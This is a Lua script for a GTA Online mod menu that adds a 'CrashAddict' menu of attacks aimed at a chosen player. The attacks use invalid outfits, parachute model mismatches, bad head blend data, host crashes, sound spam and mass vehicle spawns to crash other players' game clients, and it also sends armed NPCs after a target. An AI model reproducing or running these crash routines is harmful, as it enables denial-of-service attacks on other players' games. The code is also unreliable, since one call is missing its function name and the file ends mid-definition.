util.require_natives("natives-1663599433-uno")
util.require_natives(1651208000)
players.on_join(function(pid)






local function BlockSyncsExcept(pid, state) -- false as in allow syncs, true as in block syncs
    for _, pid2 in pairs(players.list(false, true, true)) do
        if pid ~= pid2 then
            menu.trigger_commands("desync "..players.get_name(pid2).." "..(state and "on" or "off"))
            menu.trigger_commands("ignore "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.log("desync "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.log("ignore "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.yield()
        end
    end
end

--@alias Entity integer

---@param entity Entity
---@param distance number
---@return userdata

GetCoordsInFrontOfEntity = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end

---@param entity Entity

RequestControl = function(entity, timeOut)
	timeOut = timeOut or 1000
	local start = util.current_time_millis()
	while not NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and
	util.current_time_millis() - start < timeOut do
		util.yield_once()
	end
	return util.current_time_millis() - start < timeOut
end

---@param list Entity[]

ClearEntities = function(list)
	for _, entity in ipairs(list) do
		if ENTITY.DOES_ENTITY_EXIST(entity) then
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
			RequestControl(entity)
			entities.delete_by_handle(entity)
		end
	end
end
function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --



local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(menu.my_root(), listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if Invincible then
		ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_object(Hash, Pos)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if static then
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end


local function setAttribute(attacker)
    PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)

    PED.SET_PED_COMBAT_RANGE(attacker, 4)
    PED.SET_PED_COMBAT_ABILITY(attacker, 3)
end

local function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end

local CrashAddict = menu.list(menu.player_root(pid), "[CrashAddict] :D", {""}, "")

local InvalidData = menu.list(CrashAddict, "Invalid Shaders", {}, "")
local InvalidTasks = menu.list(CrashAddict, "Invalid Tasks", {}, "")
local InvalidOutfit = menu.list(CrashAddict, "Invalid Outfit", {}, "")
local InvalidAttachment = menu.list(CrashAddict, "Invalid Attachment", {}, "")
local SyncMismatch = menu.list(CrashAddict, "Net Sync Mismatch", {}, "")
local HeadBlend = menu.list(CrashAddict, "Bad Head Blend", {}, "")
local HostCrash = menu.list(CrashAddict, "Host Crash", {}, "")
local SoundCrash = menu.list(CrashAddict, "Sound Crash", {}, "")
local EntitySpam = menu.list(CrashAddict, "Entity Spam", {}, "")
local InvalidObject = menu.list(CrashAddict, "World Objects", {}, "")
local SessionWide = menu.list(CrashAddict, "Sessionwide", {}, "")
local ScriptEvents = menu.list(CrashAddict, "Script Event Crashes", {}, "")
local ScriptKicks = menu.list(CrashAddict, "Kicks", {}, "")
local Triggerscomands = menu.list(CrashAddict, "Triggers Comands", {}, "")

menu.action(InvalidData, "Invalid Vehicle Data", {"vehdata"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local sentinel = util.joaat("sentinel")

    STREAMING.REQUEST_MODEL(sentinel)
    while not STREAMING.HAS_MODEL_LOADED(sentinel) do
        util.yield()
    end

    local vehicle = entities.create_vehicle(sentinel, pos, 0)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 34, 3, false)
    util.yield(1000)
    entities.delete_by_handle(vehicle)
end)

menu.action(InvalidTasks, "Vehicle Temp Action 5G", {""}, "", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    pos.z = pos.z - 50

    BlockSyncs(pid, function()
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")

        ENTITY.FREEZE_ENTITY_POSITION(my_ped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z, false, false, false)
        util.yield()
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
        end
        util.yield()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z, false, false, false)
        ENTITY.FREEZE_ENTITY_POSITION(my_ped, false)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
    end)
end)
menu.action(InvalidTasks, "Sans Undertale The Cum Reaper", {}, "recommended to stay away", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    local chop = util.joaat('cs_tenniscoach')
    STREAMING.REQUEST_MODEL(chop)
    while not STREAMING.HAS_MODEL_LOADED(chop) do
        STREAMING.REQUEST_MODEL(chop)
        util.yield()
    end
    local achop = entities.create_ped(26, chop, c, 0)
    WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_hominglauncher'), 9999, false, false)
    TASK.TASK_COMBAT_PED(achop, p, 0, 16)
    setAttribute(achop)
    local bchop = entities.create_ped(26, chop, c, 0)
    WEAPON.GIVE_WEAPON_TO_PED(bchop, util.joaat('weapon_mg'), 9999, false, false)
    TASK.TASK_COMBAT_PED(bchop, p, 0, 16)
    setAttribute(bchop)
    util.yield(10000)
    entities.delete_by_handle(bchop)
    entities.delete_by_handle(achop)
    if not STREAMING.HAS_MODEL_LOADED(chop) then
        util.toast("Couldn't load the model")
    end
end)
menu.action(InvalidTasks, "Child Protective Services", {"cps"}, "", function()
    local mdl = util.joaat('A_C_Poodle')
    BlockSyncs(pid, function()
        if request_model(mdl, 2) then
            local oldpos = players.get_position(players.user())
            local pos = players.get_position(pid)
            menu.trigger_commands("spectate" .. players.get_name(pid) .. " off")
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, pos, 0) 
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            TASK.TASK_COMBAT_PED(ped1, ped, 0, 16)
            setAttribute(ped1)
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(250)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), oldpos.x, oldpos.y, oldpos.z, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
        else
            util.toast("Failed to load model. :/")
        end
    end)
end)

menu.action(InvalidTasks, "Fake Taxi", {";)"}, "Inconsistent Garbage. Works on most menus.", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("mp_m_freemode_01")
    local veh_mdl = util.joaat("taxi")
    util.request_model(veh_mdl)
    util.request_model(mdl)
        for i = 1, 10 do
            if not players.exists(pid) then
                return
            end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(1000)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end  
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end)





menu.action(InvalidTasks, "Lil Yachty", {}, "lilyachty", function()
    local user = players.user_ped()
    local pos = players.get_position(pid)
    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    local mdl = util.joaat("apa_mp_apa_yacht")
    menu.trigger_commands("anticrashcam on")
    BlockSyncs(pid, function()
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
        PLAYER._SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z + 300, false, false, false)
        util.yield(1000)
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        util.yield(250)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        PAD._SET_CONTROL_NORMAL(0, 145, 1.0)
        util.yield(250)
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        util.yield(1500)
    end)
    PLAYER._CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    ENTITY.SET_ENTITY_COORDS(user, old_pos, false, false)
    menu.trigger_commands("anticrashcam off")
end)
menu.action(InvalidOutfit, "Invalid Outfit Compenents", {"outfitcomp"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    while not STREAMING.HAS_MODEL_LOADED(0x0D7114C9) do
        STREAMING.REQUEST_MODEL(0x0D7114C9)
        util.yield()
    end

    local michael = entities.create_ped(0, 0x0D7114C9, pos, 0)
    for i = 1, 20 do
        PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 8, 0)
        PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 9, 0)
        util.yield()
    end
    util.yield(500)
    ENTITY.SET_ENTITY_COORDS(michael, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(michael)
end)
menu.action(InvalidOutfit, "North Killer", {"crashv1"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local michael = util.joaat("player_zero")
    while not STREAMING.HAS_MODEL_LOADED(michael) do
        STREAMING.REQUEST_MODEL(michael)
        util.yield()
    end
    local ped = entities.create_ped(0, michael, pos, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
    util.yield()
    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(ped)

end)

menu.action(InvalidAttachment, "Modified Bro Hug Beta ", {"brohug"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local ped = util.joaat("a_f_y_topless_01") 
    pos.z = pos.z - 50
    while not STREAMING.HAS_MODEL_LOADED(ped) do
        STREAMING.REQUEST_MODEL(ped) 
        util.yield()
    end

    local poop = entities.create_ped (0, ped, pos, 0.0)
    (poop, poop,0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
    util.yield(1000)
    entities.delete_by_handle(poop)
end)





menu.action(SyncMismatch, "Parachute Mismatch", {"paragone"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    BlockSyncs(pid, function()
        util.yield(500)

        local crash_parachute = util.joaat("prop_logpile_06b")
        local parachute = util.joaat("p_parachute1_mp_dec")

        STREAMING.REQUEST_MODEL(crash_parachute)
        STREAMING.REQUEST_MODEL(parachute)

        for i = 1, 3 do
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), crash_parachute)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
        end

        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), parachute)
        util.yield(500)
    end)
end)

menu.toggle(SyncMismatch, "Parachute Mismatch v2", {"chutemodel"}, "", function(toggle)
    local veh = entities.get_user_vehicle_as_handle()
    local model = util.joaat("apa_mp_apa_yacht")
    local normal_model = util.joaat("imp_prop_impexp_para_s")
    if toggle then
        BlockSyncsExcept(pid, true)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(entities.get_user_vehicle_as_handle(), util.joaat("apa_mp_apa_yacht"))
    else
        util.yield()
        BlockSyncsExcept(pid, false)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY()
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(veh, normal_model)
        util.toast("Parachute Returned To Normal")
    end
end)
menu.action(SyncMismatch, "Mother Nature v1", {"nature"}, "", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
    local pos = players.get_position(user)
    BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
        util.yield(100)
        menu.trigger_commands("invisibility on")
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
        menu.trigger_commands("invisibility off")
    end)
end)
menu.action(SyncMismatch, "Mother Nature v2", {""}, "", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(pid, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
    end)
end)

menu.action(HeadBlend, "Bad Head Blend", {"outfitcrash"}, "", function()
    local mdl = util.joaat("mp_m_freemode_01")
    STREAMING.REQUEST_MODEL(mdl)
    local pos = v3.new(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local usr = players.user()
    BlockSyncs(pid, function()
        util.yield()
        local old_ped = players.user_ped()
        local new_ped = entities.create_ped(2, mdl, pos, 0)
        --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
        util.yield(5000)
        --NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
        util.yield()
        --PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
        entities.delete_by_handle(new_ped)
        v3.free(pos)
    end)
end)
menu.action(HeadBlend, "Bad Head Blend v2", {""}, "", function()
    local outfit_component_table = {}
    local outfit_component_texture_table = {}
    local outfit_prop_table = {}
    local outfit_prop_texture_table = {}
    for i = 0, 11 do
        outfit_component_table[i] = PED.GET_PED_DRAWABLE_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), i)
        outfit_component_texture_table[i] = PED.GET_PED_TEXTURE_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), i)
    end
    for i = 0, 2 do
        outfit_prop_table[i] = PED.GET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), i)
        outfit_prop_texture_table[i] = PED.GET_PED_PROP_TEXTURE_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), i)
    end
    BlockSyncs(pid, function()
        local time = (util.current_time_millis() + 5000)
        while time > util.current_time_millis() do
            util.yield(10)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 0, 17, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 1, 55, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 2, 40, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 3, 44, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 4, 31, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 5, 0, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 6, 24, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 7, 110, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 8, 55, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 9, 9, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 10, 45, math.random(0, 50), 0)
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 11, 69, math.random(0, 50), 0)
            PED.SET_PED_HEAD_BLEND_DATA(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
        end
        util.yield(200)
        for i = 0, 11 do
            PED.SET_PED_COMPONENT_VARIATION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), i, outfit_component_table[i], outfit_component_texture_table[i], 0)
        end
        for i = 0, 2 do
            PED.SET_PED_PROP_INDEX(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), i, outfit_prop_table[i], outfit_prop_texture_table[i], 0)
        end
        util.toast("Finished")
    end)
end)


menu.action(HostCrash, "Host Crash v1", {""}, "", function()
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 10841.274, -6928.6284, 1.0732422, true, false, false, false)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
end)

menu.action(HostCrash, "Host Crash v2", {"hostcrash"}, "", function()
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, -6169.9453, 10836.955, 39.99597, true, false, false, false)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
end)

menu.action(HostCrash, "Host Pedswap Crash", {""}, "", function()
    local mdl = util.joaat("mp_m_freemode_01")
    STREAMING.REQUEST_MODEL(mdl)
    local usr = players.user()
    local pos = (ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    local old_ped = players.user_ped()
    util.yield(500)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(new_ped, -6170, 10835, 40, true, false, false, false)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(new_ped)
    util.yield(500)
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
end)

menu.divider(SoundCrash, "Sessionwide")
menu.click_slider(SoundCrash, "Global Crash", {"soundcrash"}, "", 1, 4, 1, 1, function(slider)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local time = util.current_time_millis() + 2000
    if slider == 1 then
        while time > util.current_time_millis() do
            for i = 1, 5 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "ROUND_ENDING_STINGER_CUSTOM", pos.x, pos.y, pos.z, "CELEBRATION_SOUNDSET", true, 999999999, false)
            end
            util.yield()
        end
    elseif slider == 2 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '10s', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 999999999, false)
            end
        util.yield()
    end
    elseif slider == 3 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Oneshot_Final', pos.x, pos.y, pos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 999999999, false)
            end
        util.yield()
    end
    elseif slider == 4 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", pos.x, pos.y, pos.z, "MP_MISSION_COUNTDOWN_SOUNDSET", true, 999999999, false)
            end
            util.yield()
        end
    end
end)

menu.divider(SoundCrash, "Controlled")
menu.click_slider(SoundCrash, "Controlled Crash", {"soundcrash2"}, "", 1, 3, 1, 1, function(slider)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local time = util.current_time_millis() + 2000
    if slider == 1 then
        while time > util.current_time_millis() do
            for i = 1, 5 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Object_Dropped_Remote", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
        util.yield()
    end
    elseif slider == 2 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Checkpoint_Cash_Hit", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
        util.yield()
    end
    elseif slider == 3 then
        while time > util.current_time_millis() do
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "GTAO_FM_Events_Soundset", true, 1, false)
            end
            util.yield()
        end
    end
end)

local crash_thing = menu.list(EntitySpam, "Microsoft Flight Simulator", {}, "")
local things = {
    "havok",
    "alphaz1",
    "tula",
    "rogue",
    "molotok",
    "starling",
    "pyro",
    "howard",
    "strikeforce",
    "skylift"
}

local type1 = ""
local spawn_type = menu.list(crash_thing, "Plane Type", {}, "")
for id, name in pairs(things) do
    menu.toggle(spawn_type, name, {}, "", function(h)
        type1 = name
    end)
end

menu.action(crash_thing, "Send Crash", {}, "", function()
    local veh = util.joaat(type1)
    STREAMING.REQUEST_MODEL(veh)
    while not STREAMING.HAS_MODEL_LOADED(veh) do
        util.yield()
    end
    local vehicle = {}
    for i = 1, 150 do
        vehicle[i] = entities.create_vehicle(veh, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 20, 5), 0)
        NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(veh)
    end
    util.yield(3000)
    for i = 1, #vehicle do
        entities.delete_by_handle(vehicle[i])
    end
end)

local nuke = menu.list(EntitySpam, "Nuke", {}, "")
local  spawnDistance = 250
local selected = 1
local antichashCam <const> = menu.ref_by_path("Game>Camera>Anti-Crash Camera", 38)
local spawnedPlanes = {}
local vehicleType = { 'volatol', 'bombushka', 'jet', 'hydra', 'luxor2', 'seabreeze', 'tula', 'avenger2' }

